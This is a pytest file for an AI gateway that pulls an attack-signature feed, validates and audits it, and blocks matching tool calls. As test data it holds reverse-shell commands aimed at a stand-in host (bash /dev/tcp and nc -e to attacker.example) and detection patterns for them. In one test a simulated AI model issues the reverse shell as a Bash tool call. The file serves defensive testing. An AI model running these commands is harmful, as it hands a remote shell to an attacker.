"""The attack-signature feed is pulled from an outside source (the brief's "signatures fed from an externally managed
system"), checked before it is trusted, and audited like any policy change. The feed server is simulated in-process."""

import asyncio
import json

import httpx
import pytest

from acl.policy import parse_signatures

TORCH = {
    "id": "SIG-TEST-TORCH", "title": "Unsafe model loading", "severity": "critical", "published": "2025-04-17",
    "cve": "CVE-2025-32434", "where": ["tool_args"], "pattern": r"torch\.load\((?![^)]*weights_only\s*=\s*True)",
    "ref": "torch.load without weights_only", "sources": ["https://nvd.nist.gov/vuln/detail/CVE-2025-32434"],
    "examples": {"match": ["m = torch.load('model.bin')"], "no_match": ["m = torch.load('model.bin', weights_only=True)"]},
}
NEW = {"id": "SIG-TEST-REVSHELL", "where": ["tool_args"], "pattern": r"bash\s+-i\s+>&\s*/dev/tcp/", "ref": "reverse shell",
       "severity": "critical", "examples": {"match": ["bash -i >& /dev/tcp/attacker.example/4444 0>&1"], "no_match": ["bash -i"]}}


def feed(*sigs):
    return json.dumps({"feed": "test", "signatures": list(sigs)})


def serve(gw, responses):
    """Point the gateway's feed puller at a fake feed server that answers with `responses` in turn."""
    answers = iter(responses)

    def handler(request: httpx.Request) -> httpx.Response:
        status, body = next(answers)
        return httpx.Response(status, text=body)

    gw.app.state.feed.client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
    gw.edit_policy(lambda p: p["controls"]["signatures"].update(feed_url="https://intel.example/feed.json"))
    return lambda: asyncio.run(gw.app.state.feed.pull())


def ids(gw):
    return [s["id"] for s in gw.client.get("/api/policy/details").json()["signatures"]]


def test_a_new_feed_version_is_pulled_enforced_and_audited(gw):
    pull = serve(gw, [(200, feed(TORCH)), (200, feed(TORCH, NEW))])
    assert pull()["error"] is None and ids(gw) == ["SIG-TEST-TORCH"]
    status = pull()
    assert status["error"] is None and status["count"] == 2 and ids(gw) == ["SIG-TEST-TORCH", "SIG-TEST-REVSHELL"]
    change = gw.client.get("/api/events?type=policy_change&limit=1").json()[0]
    assert {"what": "signatures", "old": ["SIG-TEST-TORCH"], "new": ["SIG-TEST-TORCH", "SIG-TEST-REVSHELL"]} in change["changes"]
    sig = gw.client.get("/api/policy/details").json()["signatures"][0]
    assert sig["severity"] == "critical" and sig["cve"] == "CVE-2025-32434" and sig["sources"]


@pytest.mark.parametrize("bad", [
    "not json",
    feed({**NEW, "pattern": "bash -i >& (unclosed"}),                         # pattern does not compile
    feed({**NEW, "examples": {"match": ["nc -e /bin/sh attacker.example"]}}),  # misses its own example
    feed({**NEW, "examples": {"match": NEW["examples"]["match"], "no_match": NEW["examples"]["match"]}}),  # hits a harmless one
    feed({**NEW, "where": ["everywhere"]}),
    feed(NEW, NEW),                                                            # duplicate id
])
def test_an_unsound_feed_is_rejected_and_the_last_good_one_stays(gw, bad):
    pull = serve(gw, [(200, feed(TORCH)), (200, bad), (200, bad)])
    pull()
    before = ids(gw)
    assert pull()["error"] and ids(gw) == before
    pull()  # the same failure again: recorded once, not on every retry
    notes = [e for e in gw.client.get("/api/events?type=policy_change&limit=20").json() if "rejected" in (e.get("error") or "")]
    assert len(notes) == 1


def test_an_unreachable_feed_keeps_the_last_good_signatures(gw):
    pull = serve(gw, [(200, feed(TORCH)), (503, "maintenance")])
    pull()
    assert "503" in pull()["error"] and ids(gw) == ["SIG-TEST-TORCH"]


def test_a_pulled_signature_blocks_the_attack_it_describes(gw):
    serve(gw, [(200, feed(TORCH, NEW))])()
    gw.upstream.next_reply = {"tool_call": {"name": "Bash", "arguments": {"command": NEW["examples"]["match"][0]}}}
    r = gw.chat("devon", [{"role": "user", "content": "check the server"}],
                tools=[{"type": "function", "function": {"name": "Bash", "parameters": {"type": "object"}}}])
    assert ("signatures", "block") in [(d["control"], d["action"]) for d in r.json()["acl"]["decisions"]]


def test_the_shipped_feed_passes_its_own_checks():
    from pathlib import Path

    root = Path(__file__).resolve().parents[1]
    for f in (root / "feeds" / "signatures.json", root / "policy" / "signatures.json"):
        assert parse_signatures(f.read_text()), f
